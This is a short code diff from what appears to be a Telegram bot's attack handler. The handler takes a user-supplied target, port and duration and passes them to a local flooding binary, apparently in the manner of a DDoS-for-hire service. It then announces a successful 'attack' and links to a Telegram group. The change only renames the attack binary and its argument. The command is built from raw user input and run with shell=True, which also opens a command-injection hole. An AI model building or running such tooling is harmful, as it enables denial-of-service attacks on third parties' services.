@@ -234,7 +234,7 @@ def handle_aadi2(message):
                 record_command_logs(user_id, '/aadi2', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./KALAKUTA {target} {port} {time} CRACKS"
+                full_command = f"./Moin {target} {port} {time} 890"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/+KWXSknpfd4w2NmJl"
         else:
